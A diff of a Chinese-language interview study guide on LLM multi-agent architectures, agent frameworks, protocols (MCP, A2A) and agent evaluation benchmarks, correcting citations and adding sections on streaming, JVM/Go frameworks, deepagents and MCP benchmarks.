 [Du et al., "Improving Factuality and Reasoning in Language Models through Multiagent Debate"](https://arxiv.org/abs/2305.14325)（MIT/Google Brain，ICML 2024，数千次引用）：多个 LLM 实例各自给出答案与推理，多轮互相看到对方的论点并修订，最终收敛为共识。在小学数学、国际象棋走法、事实性 QA 上超过单 agent CoT，且对较弱模型提升更明显（强模型上边际收益收窄）。
@@ -3444,7 +3609,7 @@ Anthropic [Building Effective Agents](https://www.anthropic.com/engineering/buil
 **为何（有时）有效**：辩论相当于把 self-consistency 的"独立采样投票"升级成"带信息的迭代修订"，错误推理暴露在对抗性审视下更容易被攻破。
 
 **为何常常失效**（这是面试加分点，很多人只知道论文结论）：
-- [Smit et al., "Should we be going MAD?"](https://arxiv.org/abs/2311.17371)（InstaDeep，ICML 2024，用 GPT-4 与 Mixtral 8x7B 系统评估多种辩论策略）发现：MAD 的收益高度依赖任务与模型，很多场景打不过 self-consistency 甚至单 agent 多次细化，且成本是 N agents × M rounds；2025 年的后续实证研究《If Multi-Agent Debate is the Answer, What is the Question?》（未正式收录于 arXiv，引用时勿标注错误编号）进一步指出：一些评测中辩论的"提升"其实来自**多轮生成预算**本身，而非"辩论"这个形式；
+- [Smit et al., "Should we be going MAD?"](https://arxiv.org/abs/2311.17371)（InstaDeep，ICML 2024，用 GPT-4 与 Mixtral 8x7B 系统评估多种辩论策略）发现：MAD 的收益高度依赖任务与模型，很多场景打不过 self-consistency 甚至单 agent 多次细化，且成本是 N agents × M rounds；2025 年的后续实证研究《[If Multi-Agent Debate is the Answer, What is the Question?](https://arxiv.org/abs/2502.08788)》（arXiv:2502.08788，2025-02）进一步指出：一些评测中辩论的"提升"其实来自**多轮生成预算**本身，而非"辩论"这个形式；
 - **锚定与谄媚（anchoring & sycophancy）**：LLM 一旦被初始答案"建立信心"，后续轮次很难真正改弦更张，反而向多数派/强势措辞收敛——辩论退化为"从众"；
 - 同质模型会**互相带偏**（shared blind spots），准确率反而下降。
 - 实践建议：与其让 agent 自由辩论，不如用**结构化对抗**（指定 devil's advocate 角色 + 强制举证 + 独立裁判），或干脆用 evaluator-optimizer 回路；把辩论预算只花在高风险、可验证的判断上。
@@ -3462,7 +3627,7 @@ Anthropic [Building Effective Agents](https://www.anthropic.com/engineering/buil
 |---|---|---|---|
 | **MCP** (Model Context Protocol) | Anthropic（2024-11；OpenAI、Google 相继采纳，2025-12 捐给 Linux Foundation，由 AAIF 托管） | agent ↔ 工具/数据 | 标准化工具调用、资源与 prompt 供给，已成事实标准 |
 | **A2A** (Agent2Agent) | Google（2025-04 发布，2025-06 捐给 Linux Foundation 作为独立 LF 项目；捐赠时 100+ 组织支持、AWS/Cisco 新加入背书，2026 年 v1.0 时增至 150+） | agent ↔ agent | 跨厂商/跨框架的 agent 发现（Agent Card）、任务委派与状态管理（Task/Message/Artifact） |
-| **ACP** | IBM（BeeAI） | 组织内 agent 协调 | REST-first、local-first 的企业内多 agent 编排 |
+| **ACP**（历史协议） | IBM（BeeAI）；2025 年已并入 A2A / Linux Foundation 生态 | 组织内 agent 协调 | REST-first、local-first 的企业内多 agent 编排；作为协议演进脉络了解即可，选型时不再单列 |
 | **ANP** | 社区 | 开放网络 | 去中心化的互联网级 agent 发现与通信（基于 DID/W3C 身份） |
 | **AGENTS.md** | OpenAI（2025-12 捐给 Linux Foundation，由 AAIF 托管） | agent ↔ 代码仓库 | 约定仓库级的 agent 上下文（构建/测试/风格规范），事实上的工程惯例 |
 
@@ -3516,7 +3681,7 @@ A2A 侧（对等委派）：
 
 #### 2.8 涌现行为与协作动力学
 
-LLM-based MAS 会表现出未经显式编程的群体行为（系统综述见 [Multi-Agent Collaboration Mechanisms: A Survey of LLMs](https://arxiv.org/abs/2501.06322)，2025-01）。这类现象有清晰的研究脉络：[Generative Agents](https://arxiv.org/abs/2304.03442)（Park et al., UIST 2023）在 25 个智能体的虚拟小镇中观察到规范传播与涌现社交行为；2025 年的 Emergent Misalignment 研究（Betley et al.）则显示，在窄任务上做对抗性微调的 agent 会在广泛场景中表现出价值失调与"欺骗性迎合"倾向。Anthropic 的工程观察更务实：**对 lead agent prompt 的微小改动会在群体中层联放大**，出现难以预料的协调模式。结论不是"涌现很神奇"，而是**涌现 = 不可靠性的来源**，必须用评估与护栏（guardrails）约束，而不是期待它。
+LLM-based MAS 会表现出未经显式编程的群体行为（系统综述见 [Multi-Agent Collaboration Mechanisms: A Survey of LLMs](https://arxiv.org/abs/2501.06322)，2025-01）。这类现象有清晰的研究脉络：[Generative Agents](https://arxiv.org/abs/2304.03442)（Park et al., UIST 2023）在 25 个智能体的虚拟小镇中观察到规范传播与涌现社交行为；2025 年的 Emergent Misalignment 研究（Betley et al.）则显示，在窄任务上做对抗性微调的 agent 会在广泛场景中表现出价值失调与"欺骗性迎合"倾向。（引用须知：该研究的原对象是**单模型**窄域微调引发广域失调，把它引入 MAS 语境属类比外推——面试引用需说明这一层，否则会被追问原研究与多智能体的关系。）Anthropic 的工程观察更务实：**对 lead agent prompt 的微小改动会在群体中层联放大**，出现难以预料的协调模式。结论不是"涌现很神奇"，而是**涌现 = 不可靠性的来源**，必须用评估与护栏（guardrails）约束，而不是期待它。
 
 **失败归因的实证锚点**：本领域最标准的实证研究是 Cemri et al.（UC Berkeley）的 [《Why Do Multi-Agent LLM Systems Fail?》](https://arxiv.org/abs/2503.13657)（2025，即 **MAST**，数百次引用）。它基于 1600+ 条标注轨迹提出多智能体失败分类学：**14 种失败模式归为三大类——规格与系统设计（约 43%，原文 42.8%）、跨 agent 失配（约 32%，原文 32.4%）、任务验证与终止（约 25%，原文 24.9%）**，并给出 LLM-as-judge 自动归因管线。其核心结论与上段互为印证：**多数失败源于协调层的设计缺陷（规格含糊、缺乏验证、agent 间目标错位），而非基座模型能力不足**（2026 年的预印本 [arXiv:2605.03310](https://arxiv.org/abs/2605.03310) 给出同向判断）。这直接决定了工程重心的摆放：与其换更强模型，不如把预算投给任务书规格、输出契约与终止验证。
 
@@ -3545,7 +3710,7 @@ LLM-based MAS 会表现出未经显式编程的群体行为（系统综述见 [M
 | 基准 | 测什么 | 与多智能体的关系 |
 |---|---|---|
 | **[τ-bench](https://arxiv.org/abs/2406.12045) / τ²-bench**（Sierra） | 工具型对话任务 + **数据库终态正确性**；τ² 增加双控（用户侧也是会用工具的 agent）与 telecom 域 | 提出 **pass^k** 指标，成为客服型 agent 的可靠性行业标准 |
-| **GAIA**（Mialon et al., ICLR 2024） | 通用助理的多步工具使用 | 人类约 92%，2025 年榜首系统已超 70%，差距收窄至十余个百分点但远未闭合；多智能体系统常以此作辅助赛道 |
+| **GAIA**（Mialon et al., ICLR 2024） | 通用助理的多步工具使用 | 人类约 92%，截至 2026 年中榜首系统已达 80% 上下，差距进一步收窄但尚未闭合；多智能体系统常以此作辅助赛道 |
 | **AgentBench**（ICLR 2024） | 操作系统/数据库/知识图谱/卡牌游戏等 8 类环境交叉 | 考察异构环境下的编排与泛化 |
 | **SWE-bench 系列**（Verified 为人工去污染子集） | 真实仓库 issue 修复 | 多智能体编码流水线（orchestrator + 多 engineer worker + 测试回路）是冲榜常见路线之一 |
 
@@ -3617,7 +3782,7 @@ MAS 的历史根基比 LLM 早四十余年，面试中的"学科纵深"题常出
 - MCP（Anthropic，2024-11）解决 **agent ↔ 工具/数据源**：标准化工具定义、调用、资源与 prompt 供给，是**主从式**（client-server）关系，已被 OpenAI、Google 等采纳，成为事实标准。
 - A2A（Google，2025-04）解决 **agent ↔ agent**：通过 Agent Card 做能力发现，用 Task/Message/Artifact 建模**对等委派与长任务生命周期**（Task 状态机：submitted → working → input-required ↔ working → completed/failed/canceled），支持跨厂商跨框架互操作。
 - 治理现状（加分项，注意区分）：A2A 于 2025-06 捐给 Linux Foundation，作为**独立 LF 项目**运作；2025-12 Linux Foundation 成立 Agentic AI Foundation（AAIF），Anthropic 捐入 MCP、OpenAI 捐入 AGENTS.md、Block 捐入 goose——A2A **不在** AAIF 托管项目之列。准确表述：三大协议同归 LF 大伞下（MCP、AGENTS.md 具体由 AAIF 治理），形成分层互补格局——说明这不是厂商之争而是协议分层。
-- 不可互替：MCP 的语义是"调用一个确定性的能力端点"，没有对等协商、任务状态机与能力自描述；把另一个 agent 包成 MCP server 虽可行，但丢失了 A2A 的协商与状态语义。正确心智模型是**协议栈**：底层 MCP 接工具，上层 A2A 做组织间协作（组织内可用 ACP，开放网络可用 ANP，仓库上下文用 AGENTS.md）。
+- 不可互替：MCP 的语义是"调用一个确定性的能力端点"，没有对等协商、任务状态机与能力自描述；把另一个 agent 包成 MCP server 虽可行，但丢失了 A2A 的协商与状态语义。正确心智模型是**协议栈**：底层 MCP 接工具，上层 A2A 做组织间协作（开放网络可用 ANP，仓库上下文用 AGENTS.md；IBM/BeeAI 的 ACP 已于 2025 年并入 A2A，属历史协议，作为演进脉络了解即可）。
 - 机制深问储备：MCP 传输为 stdio / Streamable HTTP（2025-03 起取代 SSE），授权按 2025-06-18 规范走 OAuth 2.1（server 为 Resource Server，不得自签 token，经 RFC 9728/8707 发现 AS 与绑定受众）；A2A v1.0（2026）引入签名 Agent Card 与企业级鉴权。
 
 #### 题 4（进阶 ⭐⭐）：Multi-agent debate 为什么能提升推理？它的局限是什么？你会怎么改进？
@@ -3742,8 +3907,8 @@ MAS 的历史根基比 LLM 早四十余年，面试中的"学科纵深"题常出
 2. **[Anthropic — How we built our multi-agent research system](https://www.anthropic.com/engineering/multi-agent-research-system)**（2025-06）+ **[Effective context engineering for AI agents](https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents)**（2025-09）：前者是目前最详实的**生产级**多智能体工程复盘（15× token、context engineering、checkpoint、rainbow deployment、评估方法），后者把 compaction / sub-agent / note-taking 等上下文管理手段系统化；进阶必读。
 3. **[Cognition — Don't Build Multi-Agents](https://cognition.com/blog/dont-build-multi-agents)**（2025-06）及后续 **[Multi-Agents: What's Actually Working](https://cognition.com/blog/multi-agents-working)**（2026-04）：最重要的反方视角及其演进（注意后续文章的口径是"写操作单线程、helper 只提供智能"的只读/评审类场景），理解 context engineering 与 decision coupling 的关键，配合第 2 条阅读形成完整认知。
 4. **[MetaGPT: Meta Programming for A Multi-Agent Collaborative Framework](https://arxiv.org/abs/2308.00352)**（ICLR 2024 Oral）：SOP、message pool、executable feedback 的出处，理解"把人类工程流程编码进协作"的最佳论文样本。
-5. **[Du et al. — Improving Factuality and Reasoning through Multiagent Debate](https://arxiv.org/abs/2305.14325)**（ICML 2024）+ 反方 **[Should we be going MAD?](https://arxiv.org/abs/2311.17371)**（ICML 2024）+ 后续实证《If Multi-Agent Debate is the Answer, What is the Question?》（2025，未见于 arXiv，检索时勿信错误编号）：debate 模式正反多方一起读，面试中展现批判性思维。
-6. **[A Survey of Agent Interoperability Protocols: MCP, A2A, ACP, ANP](https://arxiv.org/abs/2505.02279)**（2025）+ **[LangChain — Benchmarking Multi-Agent Architectures](https://www.langchain.com/blog/benchmarking-multi-agent-architectures)**（2025-06）+ **[Agentic AI Foundation](https://aaif.io/)**（2025-12）：建立协议栈全景与治理格局（注意 A2A 为独立 LF 项目、不在 AAIF 托管之列），并拿到 supervisor vs swarm 的实测数据（电话传话效应、token 曲线），是协议题与选型题的弹药库。
+5. **[Du et al. — Improving Factuality and Reasoning through Multiagent Debate](https://arxiv.org/abs/2305.14325)**（ICML 2024）+ 反方 **[Should we be going MAD?](https://arxiv.org/abs/2311.17371)**（ICML 2024）+ 后续实证《[If Multi-Agent Debate is the Answer, What is the Question?](https://arxiv.org/abs/2502.08788)》（arXiv:2502.08788，2025-02）：debate 模式正反多方一起读，面试中展现批判性思维。
+6. **[A Survey of Agent Interoperability Protocols: MCP, A2A, ACP, ANP](https://arxiv.org/abs/2505.02279)**（2025）+ **[LangChain — Benchmarking Multi-Agent Architectures](https://www.langchain.com/blog/benchmarking-multi-agent-architectures)**（2025-06）+ **[Agentic AI Foundation](https://aaif.io/)**（2025-12）：建立协议栈全景与治理格局（注意两点：A2A 为独立 LF 项目、不在 AAIF 托管之列；综述中的 ACP 其后已并入 A2A，属历史协议），并拿到 supervisor vs swarm 的实测数据（电话传话效应、token 曲线），是协议题与选型题的弹药库。
 7. **[Multi-Agent Collaboration Mechanisms: A Survey of LLMs](https://arxiv.org/abs/2501.06322)**（2025-01）：对协作机制（通信拓扑、角色分工、涌现行为）的系统学术综述，适合补理论纵深。
 8. **[OpenAI — New tools for building agents（Agents SDK）](https://openai.com/index/new-tools-for-building-agents/)**（2025-03）与 **[OpenAI Agents SDK 文档](https://openai.github.io/openai-agents-python/)**：handoff / agents-as-tools / guardrails / sessions 四个原语的最简参考实现，配合 LangGraph supervisor/swarm 文档对照阅读，可把"协作原语"这一层彻底打通。
 9. **[Cemri et al. — Why Do Multi-Agent LLM Systems Fail?（MAST）](https://arxiv.org/abs/2503.13657)**（2025）：多智能体失败分类学的标准实证（14 种失败模式、三大类占比 42.8% / 32.4% / 24.9%、LLM-as-judge 自动归因管线），调试题、可靠性题与"为什么失败"类追问的学术锚点。
@@ -3803,7 +3968,7 @@ MAS 的历史根基比 LLM 早四十余年，面试中的"学科纵深"题常出
 │   ├── OpenAI Agents SDK（原 Swarm 演进，2025.3）
 │   │   ├── 极简原语：Agent / Handoff / Guardrails / Sessions / Tracing
 │   │   ├── Runner.run() 执行循环；Context 依赖注入
-│   │   ├── 模型无关：ChatCompletionsModel 适配任意 OpenAI 兼容端点
+│   │   ├── 模型无关：OpenAIChatCompletionsModel 适配任意 OpenAI 兼容端点
 │   │   └── 背景：Responses API 取代 Assistants API（后者 2026.8 退场）
 │   ├── Google ADK（Agent Development Kit，2025.4 开源）
 │   │   ├── 层级式多 Agent（root agent + sub_agents 树）/ Callbacks / Artifacts
@@ -3828,7 +3993,7 @@ MAS 的历史根基比 LLM 早四十余年，面试中的"学科纵深"题常出
 ├── 二、低代码 / 可视化平台（Low-code / No-code）
 │   ├── Dify（开源，Python + React）
 │   │   ├── Chatflow / Workflow / Agent 三种应用类型 + 可视化画布
-│   │   ├── Dify 1.0（2025.1）：插件体系 + 插件市场
+│   │   ├── Dify 1.0（2025.2）：插件体系 + 插件市场
 │   │   ├── 内置 RAG Pipeline / 多模型管理 / API 优先
 │   │   └── 企业私有化部署优势
 │   ├── Coze（扣子，字节跳动，Golang 微服务，C 端体验优先）
@@ -3950,6 +4115,16 @@ app = graph.compile(checkpointer=InMemorySaver())
 - ❌ 混淆 Checkpointer 与 Store：前者按 `thread_id` 隔离（会话内），后者按 namespace 共享（跨会话）。
 - ❌ 以为 resume 是"从 interrupt 那一行接着跑"——实际是**整个节点从头重放**，interrupt 前的副作用会重跑，不做幂等就会重复执行（见 5.11）。
 
+#### 框架级流式输出机制：把 Agent 中间步骤实时推给前端
+
+"用户盯着 30 秒白屏"是 Agent 产品的常见死因，"怎么把中间步骤流式推给前端"因此成为框架实操高频题。
+
+- **LangGraph 多路 stream_mode**：`stream()/astream()` 支持 `values`（每个 super-step 后的全量 State）/ `updates`（各节点返回的增量更新）/ `messages`（LLM token 级流 + 元数据）/ `custom`（节点或工具内用 `get_stream_writer()` 主动推送自定义进度），可传列表**组合多路**，产出 `(mode, chunk)` 元组按通道分发；需要更细事件粒度时用 `astream_events`（`on_chat_model_stream` 等底层回调事件流）。
+- **token 级透传**：`messages` 模式的关键是**冒泡**——不止顶层节点，**子图与工具内部发起的 LLM 调用**产生的 token 也会携带元数据（节点名 / tags / 命名空间）流到顶层，前端据此区分"哪个 Agent 在说话"；`subgraphs=True` 可同时拿到子图的状态更新。
+- **前端消费层**：后端以 SSE 推流后，TS 侧常用 **Vercel AI SDK** 的 `useChat` 按其数据流协议分类型渲染（文本增量 / 工具调用 / 自定义 data part）；**AG-UI 协议**（2025，CopilotKit 主导）进一步把"Agent → 前端"事件流标准化为十余种事件类型（文本增量、工具调用起止、STATE_DELTA 状态补丁等），LangGraph / Mastra 等已有适配——可对答一句"MCP 连工具、A2A 连 Agent、AG-UI 连用户界面"。
+
+**追问"为什么不自己拼 SSE"怎么答**：难点不在推流本身，而在**语义通道区分**（状态快照 vs token vs 进度事件）与**嵌套执行的归属标注**（这个 token 属于哪个子图/工具调用）——框架把内部事件总线以带元数据的增量协议暴露出来，正是裸拼 SSE 最难补齐的部分。
+
 ---
 
 #### 2.2 LlamaIndex：从数据框架到事件驱动 Agent 编排
@@ -4051,7 +4226,7 @@ Semantic Kernel（SK）是微软面向企业（.NET/Java/Python 技术栈）的 
 
 **是什么**
 
-2025 年 3 月，OpenAI 将实验性项目 Swarm 升级为生产级 **Agents SDK**（Python + TypeScript），设计哲学是"极少抽象"：
+2025 年 3 月，OpenAI 将实验性项目 Swarm 升级为生产级 **Agents SDK**（Python 首发；TypeScript 版 2025 年 6 月跟进），设计哲学是"极少抽象"：
 - **Agent**：instructions + model + tools 的封装。
 - **Handoff**：Agent 间的任务移交原语。一个 Agent 可将对话整体移交给另一个 Agent（类似客服转接）。
 - **Guardrails**：输入/输出验证层，可与主 Agent **并行执行**，tripwire 触发即中止。
@@ -4061,7 +4236,7 @@ Semantic Kernel（SK）是微软面向企业（.NET/Java/Python 技术栈）的 
 
 **两点重要更正/补充**
 
-1. SDK 并非"只能绑 OpenAI"：通过 `ChatCompletionsModel` 可对接任意 OpenAI 兼容端点（含开源模型），是**模型无关**的轻量 SDK。
+1. SDK 并非"只能绑 OpenAI"：通过 `OpenAIChatCompletionsModel` 可对接任意 OpenAI 兼容端点（含开源模型），另有 LiteLLM 集成路径（`LitellmModel`）覆盖更多模型供应商，是**模型无关**的轻量 SDK。
 2. 其背后是 OpenAI 的 API 代际更替：**Responses API**（2025.3）合并了 Chat Completions 与 Assistants 的能力，**Assistants API 将于 2026 年 8 月退场**——任何基于 Assistants API 的存量代码都面临迁移。
 
 **为什么值得关注**
@@ -4074,7 +4249,7 @@ Semantic Kernel（SK）是微软面向企业（.NET/Java/Python 技术栈）的 
 
 **Dify**（开源，Python + React）：
 - 三种应用模式：Chatflow（对话流）、Workflow（任务流）、Agent（自主推理）。
-- **Dify 1.0（2025.1）** 引入插件体系与插件市场，工具/模型扩展不再依赖改源码。
+- **Dify 1.0（2025.2）** 引入插件体系与插件市场，工具/模型扩展不再依赖改源码。
 - 内置 RAG Pipeline：支持多种分段策略、向量库对接、Rerank。
 - 可视化画布 + 代码节点（Python/JS），兼顾低代码与可扩展性。
 - 企业场景：私有化部署、多模型管理、API 优先设计。
@@ -4115,6 +4290,10 @@ Anthropic 在 [Building Effective Agents](https://www.anthropic.com/engineering/
    先用裸 API 跑通，理解底层逻辑后再引入框架。框架的价值在于**标准化复杂模式**（持久化、HITL、分布式），而非替代理解。
 
 **2025-2026 年的后续验证**：这一哲学被全行业跟进——OpenAI Agents SDK、Google ADK、AWS Strands、Pydantic AI、smolagents 全部走"更少抽象、更贴近模型原生能力"路线；同时 Anthropic 自身推出的 **Claude Agent SDK**（原 Claude Code SDK，2025.9 更名）把 Claude Code 验证过的 agent loop（子 Agent、hooks、权限系统、MCP）开放为通用 SDK，是"从产品中长出框架"的反向案例——这一路线在 2025H2–2026 演变为全行业的 Agent Harness 收敛（见 2.12）。
+
+#### 12-Factor Agents：给"不上重框架"立场一个具名锚点
+
+HumanLayer（Dex Horthy）2025 年开源的 **12-Factor Agents**（GitHub 高星方法论清单，向 Heroku 的 12-Factor App 致敬）把"从框架手里拿回控制权"整理成可引用的工程原则，核心几条：**own your prompts**（提示词是一等代码，不接受框架黑盒模板）、**own your context window**（自主决定上下文的组装与格式）、**工具本质是结构化输出**（tool call = LLM 输出 JSON + 确定性代码执行，别神化）、**small, focused agents**（小而聚焦的 Agent 胜过全能大 Agent）、**把 Agent 写成无状态 reducer**（状态外置，执行可暂停/恢复/审计），另有用工具调用触达人类、把错误压缩进上下文等条目。面试答"框架 vs 自己写"时引用它，比空谈"我倾向自己写"有说服力——它给这一立场提供了具名、可检验的清单。
 
 ---
 
@@ -4162,6 +4341,17 @@ Anthropic 在 [Building Effective Agents](https://www.anthropic.com/engineering/
 - 面试启示：此类框架的价值依赖**模型与框架协同设计**（co-design）；换用其他模型时需评估工具调用能力落差。
 
 选型一句话：学术讨论/协作范式研究看 MetaGPT 的 SOP；企业级分布式多 Agent 看 AgentScope；国产模型生态快速原型看 Qwen-Agent。
+
+#### JVM / Go 技术栈的 Agent 框架：把 Agent 接进现有微服务体系
+
+国内大量企业后端是 Java/Go 微服务栈，"不换语言、把 Agent 能力接进现有体系怎么选"是真实高频的选型题：
+
+- **Spring AI**（2025.5 GA 1.0）：Spring 官方 AI 抽象层——`ChatClient` 流式 API、**Advisors** 拦截链（对话记忆/RAG 增强/日志等横切能力，心智类比 LangChain 的 Middleware）、`@Tool` 注解式工具调用、向量库与 RAG 抽象、**MCP Client/Server 双向支持**；与 Spring Boot 自动装配和观测体系无缝集成，是"Java 企业栈引入 Agent"的默认答案。
+- **Spring AI Alibaba**：在 Spring AI 之上叠加通义（Qwen/百炼）生态适配，并提供 graph 式多智能体编排，国内 Java 团队常见组合。
+- **LangChain4j**：JVM 社区主力（与 LangChain 官方无隶属关系），2025 年发布 1.0，覆盖模型接入/工具/RAG/记忆，API 独立设计，适合非 Spring 技术栈或想要更薄抽象的团队。
+- **字节 Eino**（CloudWeGo 开源，Go）：强类型**组件化编排**——ChatModel/Tool/Retriever 等类型安全组件抽象 + Chain/Graph 编排，复用 CloudWeGo 微服务生态，是 Go 栈生产 Agent 的代表答案。
+
+**面试答法**：先亮原则——"语言栈跟随现有工程体系，而非为 Agent 换语言"：Java 微服务体系选 Spring AI（吃 Spring 生态复利：装配/观测/安全），Go 体系看 Eino；再补一句协议层视角：MCP/A2A 正在拉平跨语言差异，Python 编排层 + Java/Go 业务工具（以 MCP Server 形式暴露）也是常见混合架构。
 
 ---
 
@@ -4223,6 +4413,17 @@ Skills 是 Anthropic 于 2025 年 10 月推出的能力扩展机制：把领域�
 - Harness 为什么在编码场景大成而通用框架饱受争论？因为**编码/运维场景的环境本身提供即时验证信号**（编译、测试、lint、文件 diff），反馈闭环完整；泛化到无验证信号的场景，编排层与护栏仍有价值。
 - 被问"你会怎么搭一个 Agent"时，2026 年的标准答案模板是：loop + 标准工具集 + 权限 + compaction/子 Agent + MCP/Skills 扩展——而不是"先画一张图"。LangChain 1.0 的 create_agent + Middleware 体系正是框架世界对这一范式的回应。
 
+#### LangChain deepagents：把 harness 范式做成脚手架
+
+LangChain 于 2025 年中推出 **deepagents**（借鉴 Claude Code / Deep Research 一类 "deep agent" 的实践），把上述 harness 结构直接产品化为可安装的脚手架，核心是四件套：
+
+1. **Planning / todo 工具**：内置任务清单工具，让模型把计划外化为可审工件（对应 Claude Code 的 plan/TODO 心智）；
+2. **虚拟文件系统**：`ls`/`read_file`/`write_file`/`edit_file` 等文件工具默认操作 **state 内的虚拟 files**（不落盘、随 checkpoint 持久化），后续版本支持切换真实文件系统/沙箱后端——长任务中间产物外置，不挤占上下文窗口；
+3. **Subagents**：内置子 Agent 机制做**上下文隔离**（探索与阅读噪音留在子 Agent，主循环只收结论）；
+4. **内置长 system prompt**：借鉴 Claude Code 系统提示写法的通用长提示，开箱即含工具使用与规划规范。
+
+`create_deep_agent(tools=..., instructions=...)` 一行起手，底层编译为 LangGraph 图（checkpoint/HITL 能力全继承）。**定位关系是考点**：LangGraph 是"编排底层"，deepagents 是其上的"deep agent 应用层"——框架世界给出的 harness 参考实现；被问"自研 harness 还是用现成"时，它是"用现成"一侧的具体论据。
+
 ---
 
 #### 2.13 执行环境基础设施：代码沙箱与 Computer Use
@@ -4264,7 +4465,9 @@ Agent 的能力面从"工具调用"扩展到"**GUI 操作**"，2024–2026 年�
 | Agent 可观测性与评估体系（Tracing / LLM-as-Judge / 轨迹评估） | ⭐⭐⭐ | 工程实践 + 系统设计 |
 | AutoGen v0.4 Actor 模型 vs v0.2 对话模型 | ⭐⭐ | 对比分析题 |
 | Agent Harness 范式与 Agent Skills（2025H2–2026 收敛趋势） | ⭐⭐ | 趋势判断 + 设计题 |
+| LangChain deepagents（planning/虚拟文件系统/subagents 四件套） | ⭐ | 知识更新题 |
 | 国产与研究向框架（MetaGPT SOP 协作 / AgentScope / Qwen-Agent） | ⭐ | 广度 + 对比题 |
+| JVM / Go 栈 Agent 框架（Spring AI / LangChain4j / Eino） | ⭐ | 选型 + 广度题 |
 | 代码执行沙箱与 Computer Use 基础设施 | ⭐ | 广度 + 部署题 |
 | RAG 框架（LlamaIndex）与编排框架（LangGraph）的分工 | ⭐⭐ | 架构设计题 |
 | LangChain 1.0 create_agent + Middleware 的意义 | ⭐⭐ | 知识更新题 |
@@ -4682,7 +4885,7 @@ AutoGen v0.4 Actor 模型文档用于理解架构演进动机；Microsoft Agent 
 
 #### 📊 Agent 评估基准：HAL / τ-bench / SWE-bench
 Holistic Agent Leaderboard（Princeton）聚合主流 Agent 基准；τ-bench 是工具调用型对话 Agent 的代表性评测；编码 Agent 看 SWE-bench Verified 与 Terminal-Bench。理解这些基准的设计（为什么难、防污染怎么做）是评估类问题的弹药库。
-🔗 https://github.com/Princeton-PLATE-HAL/HAL ｜ https://github.com/sierra-research/tau-bench
+🔗 https://github.com/princeton-pli/hal-harness （官网 hal.princeton.edu）｜ https://github.com/sierra-research/tau-bench
 
 
 ---
@@ -4729,7 +4932,7 @@ Agent 评估与可观测性
 │   ├── GAIA / GAIA-2（通用助理，读→读写，人机差距，ARE 环境框架）
 │   ├── AgentBench（8 环境，LLM-as-Agent 横向对比）
 │   ├── τ-bench / τ²-bench / τ³-bench（tool-agent-user 交互、双控制、policy following、pass^k、语音模态）
-│   └── 延伸：SWE-bench(Verified/Pro)、OSWorld、WebArena、Terminal-Bench、BFCL v3（多轮工具调用）、PlanBench
+│   └── 延伸：SWE-bench(Verified/Pro)、OSWorld、WebArena、Terminal-Bench、BFCL v4（agentic：多跳工具链/记忆/web 检索/格式敏感性）、PlanBench
 ├── 6. 可观测性
 │   ├── 三大支柱：Logs / Metrics / Traces
 │   ├── 数据模型：Trace / Span / Generation / Event；分数（score）作为 trace 的标注
@@ -4743,6 +4946,7 @@ Agent 评估与可观测性
 │   ├── 用户反馈（显式/隐式）、升级机制、containment 分析
 │   ├── Shadow mode → Canary → A/B（会话级分流、序贯检验）→ 全量
 │   ├── 数据飞轮：failure mining → 失败分类学（taxonomy）→ golden set → 回归套件
+│   ├── 训练闭环：轨迹筛选 → SFT / 拒绝采样 / 偏好对（RFT）→ eval 门禁 → 灰度上线
 │   └── 人机协同：HITL vs HOTL、annotation queue、judge 校准回路
 ├── 8. 评估环境工程与可复现性
 │   ├── 确定性控制（温度/seed、版本锁定、record-replay、用户模拟器固定）
@@ -4905,9 +5109,13 @@ Agent 评估与可观测性
 | 计算机操作 | OSWorld（真机桌面，人类 72%，榜首 >60%）、WindowsAgentArena | 端到端 GUI 操作 |
 | Web Agent | WebArena / VisualWebArena / Mind2Web | 自托管真实网站任务 |
 | 终端 Agent | Terminal-Bench | 命令行环境任务 |
-| 工具调用 | BFCL v3（Berkeley） | 函数调用格式/选择/多轮多步细粒度评测 |
+| 工具调用 | BFCL v4（Berkeley） | 函数调用格式/选择/多轮多步细粒度评测；v4 转向 agentic：多跳工具链、记忆、web 检索与格式敏感性 |
 | 规划 | PlanBench | 规划可行性与重规划 |
 | 安全/对抗 | AgentDojo、InjecAgent、AgentHarm、ToolEmu | 注入攻防与危害任务（详见 2.10） |
+
+**（5）MCP 生态评估基准（2025– 新兴方向）**
+
+MCP 成为工具接入的事实标准后，"Agent 用得好 MCP 吗"独立成了评估方向：**MCP-Bench**——跨多个真实 MCP server 的多步任务基准，考察跨 server 的工具组合与长链规划，工具不再是你精心手写的函数，而是生态里参差不齐的第三方接口；**MCPMark**——对 server 做增删改查全操作的压力测试，任务要求真实改写状态而非只读问答，SOTA 模型单次通过率也不高、pass^k 回落更明显（"读易写难"在 MCP 语境下再次得到验证）；LiveMCPBench、MCPEval 等则分别提供大规模真实 server 集合与自动化评测框架，面试一句带过即可。考点在于这类基准把三件事变成了可测量对象：**工具描述质量**（description 写得差直接拖垮工具选择准确率）、**跨 server 组合能力**、**对残缺/报错 server 的错误恢复**。工程衔接：真实 MCP server 的时变数据与状态残留，正是 2.9"评估环境工程"里 record-replay 与快照重置要解决的问题。
 
 **Benchmark 使用的元认知**：公开题面 → 训练污染；榜单饱和 → 区分度消失（应定期淘汰饱和用例）；**scaffold 混淆**——同一模型在不同 harness 下分数差几十点，榜单比的是"系统"不是"模型"，解读时必须问"用的什么脚手架"；基准分布 ≠ 你的业务分布。**基准是路标不是终点，最终必须建自有评估集**。
 
@@ -4958,6 +5166,28 @@ Agent 评估与可观测性
 **部署阶段的评估递进**：Shadow mode（旁路复制流量，不影响用户，验证候选版本不"明显坏"）→ Canary（小比例真实流量）→ A/B（对照显著性）→ 全量。Agent A/B 的特殊性：会话长、转化稀疏、有副作用，需要**会话级分流**、更长观察窗、序贯检验（always-valid CI，避免偷看 p 值；实现锚点：mSPRT / GSEQ 类 always-valid 推断，或 Eppo / GrowthBook / Statsig 等平台的 sequential testing 功能），以及一组**护栏指标**（转人工率、投诉率、成本）防止赢了指标输了体验。
 
 **人机协同评估**：区分 **HITL**（人在回路内批准/修正动作后才生效，高风险操作）与 **HOTL**（人在回路上监控、异常介入）。人工评估的工程要点：rubric 先于标注员；用 golden set 质检标注员本身；报告 inter-annotator agreement（κ/α），它同时是 rubric 质量的度量；人审结果回流校准 LLM judge（judge 漂移检测）。
+
+**编码 Agent 产品的线上指标（与客服域并列的第二个域模板）**：上面的显式/隐式信号体系（重试、转人工、放弃、重开）是客服域模板；编码 Agent 产品（Copilot/Cursor/Claude Code 类）有自己的一套口径，面试常被追问：
+
